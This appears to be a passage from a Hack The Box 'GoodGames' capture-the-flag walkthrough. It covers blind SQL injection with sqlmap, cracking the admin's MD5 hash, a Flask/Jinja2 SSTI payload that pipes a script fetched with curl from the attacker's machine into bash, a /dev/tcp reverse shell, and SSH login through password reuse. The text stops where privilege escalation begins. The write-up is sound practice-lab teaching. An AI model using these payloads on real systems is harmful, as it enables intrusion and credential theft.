OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;105%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10D%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
OS:O1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11
OS:NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS
OS:%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T
OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Network Distance: 2 hops
Service Info: Host: goodgames.htb

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 554/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
1   274.29 ms 10.10.16.1
2   130.91 ms 10.129.96.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Jan  7 23:10:09 2024 -- 1 IP address (1 host up) scanned in 119.67 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Showing the only open port is a web service at port 80. Let’s access it with our preferreble browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs1.png&quot; alt=&quot;GoodGames homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at it, we notice a few things: first, we have a way to register a new account by clicking on the top-right corner link. 
It is always a good starting point when performing a pentest to register an account and check what functionalities are within the 
powers of a normal user. When we click the little man’s icon, we have a button to register a new account. Let’s hit that. After
registering a new account, we can access it using the same icon, but now providing our credentials. This is the page we arrive at
after logging in:&lt;/p&gt;

&lt;h3 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs2.png&quot; alt=&quot;mula profile page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the challenge explicitly tells us about a SQL injection vulnerability, let’s logout and log back in, but now
we will analyze the request using BurpSuite:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs3.png&quot; alt=&quot;burpsuite login request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some tests, I found that the server was responding with
‘Internal Server Error’ message (even though with a 200 status code) if I was giving a correct email with wrong credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs4.png&quot; alt=&quot;wrong credentials attempt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And also some SQL injection payloads such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;+and+1=1--;&lt;/code&gt; was not working. These were giving me ‘Incorrect credentials supplied’ for
some reason, even with the correct password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs5.png&quot; alt=&quot;sqli attempt fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So this got me thinking that neither &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; nor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; was being interpreted as comment lines.
Maybe they are being escaped. Another possibility is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;. That’s what I’ve tried, and it actually worked:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs6.png&quot; alt=&quot;sqli success&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Amazing! Now that we now that this is our injection point, we can try to enumerate the database in order to find an admin account of 
some sort. Since this injection does not retrieve anything back to us, we will have to base our search blindly. &lt;a href=&quot;https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md&quot;&gt;This&lt;/a&gt;
repo is great for testing time-based SQLi. The specific payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mula%40mula.com&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;#--;&lt;/code&gt; confirmed
a time delay of 25 seconds for the server to respond, thus the vulnerability.&lt;/p&gt;

&lt;p&gt;Since retrieving everything manually would take an unecessary amount of work, we’ll use SQLmap to our advantage. This was what I’ve 
ran:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.129.96.71/login &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;email=mula@mula.com&amp;amp;password=1234&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;,email,name,password
1,admin@goodgames.htb,admin,2b22337f218b2d82dfc3b6f77e7cb8ec
2,mula@mula.com,mula,81dc9bdb52d04dc20036dbd8313ed055 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1234&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we have the admin account + its password hash. With a quick search, we can find this hash to be a MD5 hash:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs7.png&quot; alt=&quot;hash is md5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can &lt;a href=&quot;https://crackstation.net/&quot;&gt;CrackStation&lt;/a&gt; to crack this hash:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs8.png&quot; alt=&quot;cracstation result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got the pair of credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@goodgames.htb:superadministrator&lt;/code&gt;. Let’s log in with this account now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs9.png&quot; alt=&quot;admin profile&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note that on the top-right corner we now have a gear icon which leads to  http://internal-administration.goodgames.htb/. To access this
page, we will need to add this domain to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; directory. Just run&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;machine-ip&amp;gt; internal-administration.goodgames.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and you should be able to access it right afterwards.&lt;/p&gt;

&lt;h3 id=&quot;ssti&quot;&gt;SSTI&lt;/h3&gt;

&lt;p&gt;Once we are inside the adminstration panel, we can see many different functionalities. While most of them are illustrative, I’ve
found this one to be the only one that we can actually play around with:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs10.png&quot; alt=&quot;admin panel change name&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can change our name to something else here, and since this is the only endpoint where we can actually test, this must be
the one related to Server Side Template Injection vulnerability (SSTI). But what is SSTI?&lt;/p&gt;

&lt;p&gt;SSTI is a vulnerability that occurs when an application allows user-supplied input to be executed as a part of the template rendering process. This can lead to the execution of arbitrary code, potentially leading to server compromise or data leakage.
In the worst case scenario, we could even get a reverse shell, depending on how the server sanitizes the input.&lt;/p&gt;

&lt;p&gt;Since we are dealing with a Flask application, we can limit our search scope to Python SSTI. Upon a quick search,
I found &lt;a href=&quot;https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/&quot;&gt;this&lt;/a&gt; aticle about Flask SSTI examples.
In it, we can see that a testable parameter is {{2*3}} for example. This would render into the number 6. Since changing
your full name in the application results into a template renderization, this is a perfect payload to test it out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs11.png&quot; alt=&quot;ssti first paylaod&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the vulnerability is present.&lt;/p&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;According to the article, we can see that one way to create a reverse shell is to
make the server download a bash script from our local machine and execute it. To do so, we will need to create a file with
the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;our-ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Save it under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rev-shell&lt;/code&gt; and then, start our netcat on the same port we typed in the script. Then, 
we need to make sure the server also downloads the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rev-shell&lt;/code&gt; file. To do this, we will also open a Python server
on port 80. After all of that is setup, we send this payload to the server:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{{request.application.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;curl &amp;lt;our-ip&amp;gt;/rev-shell | bash&apos;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we get our shell!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/ggs12.png&quot; alt=&quot;rev shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, we are root, but the absence of the root flag in the /root directory shows us that we might be inside a Docker container, and that we are root within the container. In real life, we would not have a flag waiting for us in /root, so we would need to resort to other techniques to check if we are inside a Docker container.
The first thing we can do is run ifconfig and check the IP address of the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# ifconfig
ifconfig
eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 1538  bytes 235795 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;230.2 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1341  bytes 2871375 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.7 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that our IP does not match the one of the actual box. Another way to check if we are indeed inside a Docker container
is to see if a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dockerenv&lt;/code&gt; file exists in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; / &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; / &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 88
drwxr-xr-x   1 root root 4096 Nov  5  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x   1 root root 4096 Nov  5  2021 ..
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;   1 root root    0 Nov  5  2021 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  5  2021 backend
drwxr-xr-x   1 root root 4096 Nov  5  2021 bin
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   5 root root  340 Jan 12 23:03 dev
drwxr-xr-x   1 root root 4096 Nov  5  2021 etc
drwxr-xr-x   1 root root 4096 Nov  5  2021 home
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A final test we can perform to determine if we are operating within a Docker environment is to examine how the filesystem is mounted:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;
Filesystem      Size  Used Avail Use% Mounted on
overlay         8.9G  5.3G  3.2G  63% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda1       8.9G  5.3G  3.2G  63% /home/augustus
shm              64M     0   64M   0% /dev/shm
tmpfs           2.0G     0  2.0G   0% /proc/acpi
tmpfs           2.0G     0  2.0G   0% /sys/firmware
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This output reveals an overlay filesystem mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, which is typical for Docker containers. It also shows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sda1&lt;/code&gt; mounted at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/augustus&lt;/code&gt;, indicating a bind mount or a volume. This specific mount point suggests 
a directory from the host system (/home/augustus) is being mapped into the container, a common practice in Docker for data persistence or sharing between the host and the container.&lt;/p&gt;

&lt;p&gt;One thing that it is important to note is that in a Docker environment, each container is typically assigned an IP address from a subnet managed by Docker. The default behavior is for Docker to create a bridge network and assign IP addresses to each container connected to this network. The first IP in the subnet, often ending in .1, is usually assigned to the gateway of the Docker bridge network, which facilitates communication between the containers and the host machine.&lt;/p&gt;

&lt;p&gt;Since our container’s IP ends with .2, then it is highly likely that the .1 address is the one that links the container to the
host machine. We can check if SSH port on this gateway is open by using this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;3 bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cat &amp;lt; /dev/null &amp;gt; /dev/tcp/172.19.0.1/22&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If no error messages are shown, then it is probable that the port is open and we can try to SSH into the machine. From our enumeration, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;augustus&lt;/code&gt; is a user. Based on the problem description, we see that it mentions password reuse. If
that is the case, then the SSH credentials might be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;augustus:superadministrator&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
augustus@172.19.0.1 password: superadministrator

Linux GoodGames 4.19.0-18-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 13 16:19:33 2024 from 172.19.0.2
augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we are out of the container! However, we are not root now. How could we get root having access to a privileged container and
to a less privileged user in the host machine?&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;The initial step to consider is verifying whether file transfers from the privileged container to the ‘augustus’ user are feasible. Given that /dev/sda1 is mounted at /home/augustus, a practical approach would be to copy a file into this directory from within the host. Subsequently, we can check if the file appears on the container to confirm the transfer’s success.&lt;/p&gt;

&lt;p&gt;Inside the host with ‘augustus’ user, we run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;test-file
&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;test-file
augustus@GoodGames:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x 2 augustus augustus 4096 Jan 13 16:45 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus  220 Oct 19  2021 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus 3526 Oct 19  2021 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus  807 Oct 19  2021 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 augustus augustus    0 Jan 13 16:45 test-file
&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt; 1 root     augustus   33 Jan 12 23:04 user.txt   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we go back to the container and see if the file is present:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@3a453ab39d3d:/home/augustus# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; test-file
